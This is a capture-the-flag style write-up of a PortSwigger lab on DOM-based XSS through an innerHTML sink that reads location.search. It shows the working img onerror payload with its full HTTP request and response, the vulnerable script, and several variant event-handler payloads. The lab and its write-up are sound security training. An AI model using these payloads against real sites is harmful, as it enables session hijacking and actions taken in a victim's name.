# LAB: DOM XSS in innerHTML sink using source location.search

|                             |                                                                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| **Topic**                   | Cross-site scripting (XSS)                                                                                                    |
| **Difficulty**              | Apprentice                                                                                                                     |
| **Date**                    | 2026-11-23                                                                                                                     |
| **Time**                    |           5                                                                                                                      |
| **Solved without solution** | yes                                                                                                                             |
| **Link**                    | [lab-innerhtml-sink](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)                   |

## 1. Objective

Perform a DOM-based Cross-Site Scripting (XSS) attack by exploiting a flow where user input from `location.search` is written directly into an `innerHTML` sink to execute `alert()`.

## 2. Surface

- URL query parameter (`/search?search=...`).
- Client-side JavaScript executing in the browser DOM.
- DOM Sink: `innerHTML` assignment handling search term rendering.

## 3. Hypothesis

If client-side JavaScript reads the unencoded `search` parameter from `location.search` and assigns it directly to an element's `innerHTML`, submitting standard `<script>` tags will fail due to HTML5 specifications blocking execution. However, injecting HTML elements with inline event handlers (e.g., `<img src=x onerror=...>`) will trigger arbitrary JavaScript execution upon element parsing.

## 4. Payload that worked

Request:
```http
GET /?search=xsstest%27%22%3Cimg+src%3D1+onerror%3Dalert%28document.domain%29%3E HTTP/2
Host: <host>.web-security-academy.net
Cookie: session=sess
Sec-Ch-Ua: "Not:A-Brand";v="8", "Chromium";v="156"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<host>.web-security-academy.net/?search=%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
Response:
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 6864
<h1>
  <span>0 search results for '</span>
  <span id="searchMessage">xsstest'" <img src="1" onerror="alert(document.domain)">  </span>
  <span>'</span>
</h1>
```
## 5. Why it works

Analyzing the client-side JavaScript on the search page revealed how the search query is handled:

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

The script extracts the `search` parameter directly from `window.location.search` using `URLSearchParams` and assigns its value directly to the `innerHTML` property of the `searchMessage` element without performing HTML entity encoding or sanitization.

While HTML5 specifications prevent standard `<script>` tags injected via `innerHTML` from executing, injecting an `<img>` tag with an invalid `src` attribute (e.g., `src=1`) triggers an execution path via the `onerror` event handler. When the browser attempts to parse and render the invalid image element inside the DOM, the error event fires immediately, executing the inline JavaScript payload `alert(document.domain)`.

## 6. What I tried that failed

- Submitting basic test strings containing `'"<>` confirmed that special characters were reflected raw without HTML entity encoding.
- Injecting standard `<script>` tags failed to trigger execution due to modern browser specifications that explicitly block the execution of `<script>` blocks inserted dynamically via `innerHTML`.
- Injecting a benign SVG element (`<svg width="100" ...><circle .../></svg>`) rendered successfully in the DOM, proving that arbitrary HTML elements and tags were parsed and inserted cleanly by the `innerHTML` sink.
- Rule extracted: When targeting an `innerHTML` sink, avoid `<script>` tags; instead, use alternate HTML elements that support inline event handlers (such as `<img>`, `<svg>`, or `<iframe>`) to achieve JavaScript execution upon DOM parsing.

## 7. In a real target (bounty translation)

- Where it shows up: Dynamic content updating, search preview headers, single-page application (SPA) router handling, and client-side templating without proper sanitization.
- Quick detection: Audit client-side scripts for `innerHTML`, `outerHTML`, or `$().html()` calls consuming `location.search`, `location.hash`, or storage objects without HTML entity encoding.
- Impact: Client-side JavaScript execution leading to DOM manipulation, session token theft via accessible cookies/storage, or arbitrary actions performed in the victim's session.
- In the report: Point out the un-sanitized source-to-sink flow, document the HTML5 `<script>` restriction bypass via event handlers, and provide the reproduction link.

## 8. Bypass / variants noticed

- Using alternative HTML tags supporting execution handlers upon insertion into the DOM, such as `<svg onload=alert(document.domain)>` or `<iframe src="javascript:alert(document.domain)">`.
- Injecting tags with different event triggers, such as `<body onload=alert(document.domain)>` or auto-focusing elements like `<input autofocus onfocus=alert(document.domain)>`.

## 9. Takeaway

Do not assign untrusted user input directly to `innerHTML`. Use safer DOM manipulation APIs such as `textContent` or element attribute assignments, or ensure the input passes through a robust HTML sanitizer before rendering.
